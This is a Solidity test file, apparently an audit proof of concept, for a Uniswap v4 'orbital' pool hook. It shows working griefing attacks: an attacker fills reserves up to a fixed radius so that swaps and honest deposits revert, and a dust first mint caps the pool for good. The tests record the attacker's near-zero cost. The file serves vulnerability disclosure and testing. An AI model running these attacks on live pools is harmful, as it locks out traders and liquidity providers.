// SPDX-License-Identifier: BSL-1.1
pragma solidity ^0.8.0;

import {IERC20} from "@crane/contracts/interfaces/IERC20.sol";
import {PoolKey} from "@crane/contracts/protocols/dexes/uniswap/v4/types/PoolKey.sol";
import {Currency} from "@crane/contracts/protocols/dexes/uniswap/v4/types/Currency.sol";
import {SwapParams} from "@crane/contracts/protocols/dexes/uniswap/v4/types/PoolOperation.sol";
import {
    TestBase_UniswapV4StandardExchangeOrbitalBufferHook
} from "contracts/hooks/uniswap/v4/standardExchange/orbital/TestBase_UniswapV4StandardExchangeOrbitalBufferHook.sol";

/// r2-h2-orbital-fixed-radius-cap
/// R is written once (Common._applyAdd supply==0 branch, R = 10 * max first-mint leg) and never
/// grows or resets (PRD D21, non-goal #9). Every later join/swap requires all effective legs < R.
/// Shows: (1) attacker fill-to-R griefing with full revert reasons + max-swap-size collapse and
/// attacker cost; (2) R survives a full honest exit (MINIMUM_LIQUIDITY keeps supply > 0);
/// (3) an unprivileged tiny first mint permanently fixes R at 10x dust.
contract OrbitalFixedRadiusCap is TestBase_UniswapV4StandardExchangeOrbitalBufferHook {
    address internal attacker = address(0xA11CE);
    address internal trader = address(0x7EADE5);
    address internal lp2 = address(0x1B2);

    uint256 internal constant SEED = 1_000 ether;

    function _mintApprove(address who, uint256 amt) internal {
        token0.mint(who, amt);
        token1.mint(who, amt);
        token2.mint(who, amt);
        vm.startPrank(who);
        token0.approve(hook, type(uint256).max);
        token1.approve(hook, type(uint256).max);
        token2.approve(hook, type(uint256).max);
        token0.approve(address(swapRouter), type(uint256).max);
        token1.approve(address(swapRouter), type(uint256).max);
        token2.approve(address(swapRouter), type(uint256).max);
        vm.stopPrank();
    }

    function traderSwap0to1(uint256 amountIn) external returns (uint256 got) {
        require(msg.sender == address(this), "self");
        PoolKey memory key = _poolKeyFor(address(token0), address(token1));
        bool zeroForOne = address(token0) == Currency.unwrap(key.currency0);
        uint256 b = token1.balanceOf(trader);
        vm.prank(trader);
        swapRouter.swapExactIn(
            key,
            SwapParams({zeroForOne: zeroForOne, amountSpecified: -int256(amountIn), sqrtPriceLimitX96: _sqrtLimit(zeroForOne)}),
            ""
        );
        got = token1.balanceOf(trader) - b;
    }

    function lpJoin(address who, uint256 amt) external returns (uint256 shares) {
        require(msg.sender == address(this), "self");
        vm.prank(who);
        (shares,,,) = orbital.addLiquidity(amt, amt, amt, who, 0, block.timestamp + 1 hours, "");
    }

    function _tryTrade(uint256 amountIn) internal returns (bool ok, uint256 got, bytes memory err) {
        uint256 snap = vm.snapshotState();
        try this.traderSwap0to1(amountIn) returns (uint256 g) { ok = true; got = g; } catch (bytes memory e) { err = e; }
        vm.revertToState(snap);
    }

    function _tryJoin(address who, uint256 amt) internal returns (bool ok, bytes memory err) {
        uint256 snap = vm.snapshotState();
        try this.lpJoin(who, amt) returns (uint256) { ok = true; } catch (bytes memory e) { err = e; }
        vm.revertToState(snap);
    }

    /// largest swap (in whole tokens, 0..hi) that succeeds, by bisection
    function _maxSwap(uint256 hi) internal returns (uint256 lo) {
        lo = 0;
        while (lo < hi) {
            uint256 mid = (lo + hi + 1) / 2;
            (bool ok,,) = _tryTrade(mid * 1 ether);
            if (ok) lo = mid; else hi = mid - 1;
        }
    }

    function _sel(bytes memory e) internal pure returns (bytes4 s) {
        if (e.length >= 4) assembly { s := mload(add(e, 32)) }
    }

    function _logErr(string memory k, bytes memory e) internal {
        emit log_named_bytes(k, e.length > 36 ? abi.encodePacked(_sel(e)) : e);
    }

    uint256 internal maxBefore;
    uint256 internal atkShares;
    uint256 internal constant ATK = 8_950 ether;

    function _baseline() internal {
        _seedThreeLeg(SEED); // honest LP `user`
        _mintApprove(trader, 2_000 ether);
        _mintApprove(lp2, 1_000 ether);
        emit log_named_uint("R (wad)", orbital.radius());
        maxBefore = _maxSwap(2_000);
        (bool ok100b, uint256 got100b,) = _tryTrade(100 ether);
        (bool joinB,) = _tryJoin(lp2, 100 ether);
        assertTrue(ok100b && joinB, "baseline ok");
        emit log_named_uint("baseline max swap t0->t1 (tokens)", maxBefore);
        emit log_named_uint("baseline 100 t0 -> t1", got100b);
    }

    function _attackJoin() internal {
        _mintApprove(attacker, ATK);
        vm.prank(attacker);
        (atkShares,,,) = orbital.addLiquidity(ATK, ATK, ATK, attacker, 0, block.timestamp + 1 hours, "");
        (uint256 x0, uint256 x1, uint256 x2) = orbital.effectiveReserves();
        emit log_named_uint("leg0 eff after attacker join", x0);
        emit log_named_uint("leg1 eff after attacker join", x1);
        emit log_named_uint("leg2 eff after attacker join", x2);
    }

    function _impact() internal {
        uint256 maxAfter = _maxSwap(2_000);
        emit log_named_uint("after max swap t0->t1 (tokens)", maxAfter);
        (bool ok100a,, bytes memory e100) = _tryTrade(100 ether);
        _logErr("after 100 swap revert data", e100);
        assertFalse(ok100a, "100 swap reverts");
        (bool joinA, bytes memory eJoin) = _tryJoin(lp2, 100 ether);
        _logErr("after honest 100 join revert data", eJoin);
        assertFalse(joinA, "honest join reverts");
        (bool join1, bytes memory eJoin1) = _tryJoin(lp2, 1 ether);
        emit log_named_string("after honest 1/leg join", join1 ? "ok" : "REVERTS");
        if (!join1) _logErr("after honest 1 join revert data", eJoin1);
        assertLt(maxAfter * 10, maxBefore, "max swap size collapses >10x");
    }

    function _exit() internal {
        vm.warp(block.timestamp + 1 days);
        vm.prank(attacker);
        orbital.removeLiquidity(atkShares, attacker, 0, 0, 0, block.timestamp + 1 hours);
        uint256 spent = 3 * ATK;
        uint256 back = token0.balanceOf(attacker) + token1.balanceOf(attacker) + token2.balanceOf(attacker);
        emit log_named_uint("attacker capital in", spent);
        emit log_named_uint("attacker capital out", back);
        emit log_named_uint("attacker net cost (wei)", spent - back);
        assertLt(back, spent, "attacker makes no profit");
        assertGe(back * 1_000, spent * 999, "attacker cost < 0.1%");
        (bool okRestored,,) = _tryTrade(100 ether);
        assertTrue(okRestored, "swaps restored after attacker exit");
    }

    function test_fill_to_R_grief_accounting() public {
        _baseline();
        _attackJoin();
        _impact();
        _exit();
    }

    /// R is not reset when every honest LP exits; MINIMUM_LIQUIDITY keeps supply > 0.
    function test_R_survives_full_exit() public {
        uint256 shares = _seedThreeLeg(SEED);
        uint256 R0 = orbital.radius();
        vm.prank(user);
        orbital.removeLiquidity(shares, user, 0, 0, 0, block.timestamp + 1 hours);
        (uint256 x0, uint256 x1, uint256 x2) = orbital.effectiveReserves();
        emit log_named_uint("R after full exit", orbital.radius());
        emit log_named_uint("supply after full exit", IERC20(hook).totalSupply());
        emit log_named_uint("leg0 dust", x0);
        emit log_named_uint("leg1 dust", x1);
        emit log_named_uint("leg2 dust", x2);
        assertEq(orbital.radius(), R0, "R unchanged after full exit");
        _mintApprove(lp2, 20_000 ether);
        (bool okBig, bytes memory e) = _tryJoin(lp2, 10_000 ether);
        _logErr("rejoin 10x seed revert data", e);
        emit log_named_string("rejoin 10,000/leg", okBig ? "ok (capped?)" : "REVERTS");
        assertFalse(okBig, "10x-seed rejoin reverts after full exit");
    }

    /// Unprivileged first minter (hook live, ownerOnlyLiquidity=false) seeds dust: R fixed at 10x dust.
    function test_dust_first_mint_caps_pool_forever() public {
        _mintApprove(attacker, 10 ether);
        uint256 dust = 0.001 ether;
        vm.prank(attacker);
        orbital.addLiquidity(dust, dust, dust, attacker, 0, block.timestamp + 1 hours, "");
        uint256 R = orbital.radius();
        emit log_named_uint("R after dust first mint (wad)", R);
        assertLe(R, 10 * dust + 1, "R ~= 10x dust");
        _mintApprove(lp2, 1_000 ether);
        (bool ok, bytes memory e) = _tryJoin(lp2, 1_000 ether);
        emit log_named_string("honest 1,000/leg join", ok ? "ok" : "REVERTS");
        if (!ok) _logErr("revert data", e);
        assertFalse(ok, "honest 1,000/leg join must revert after dust first mint");
        assertEq(_sel(e), bytes4(0x13e5fe33), "ReservesExceedRadius");
        uint256 lpBal0 = token0.balanceOf(lp2);
        if (ok) {
            vm.prank(lp2);
            orbital.addLiquidity(1_000 ether, 1_000 ether, 1_000 ether, lp2, 0, block.timestamp + 1 hours, "");
            emit log_named_uint("honest token0 actually accepted", lpBal0 - token0.balanceOf(lp2));
            assertLt(lpBal0 - token0.balanceOf(lp2), 10 * dust, "honest deposit capped at dust scale");
        }
        emit log_named_uint("attacker cost (token0 wei)", 10 ether - token0.balanceOf(attacker));
    }
}
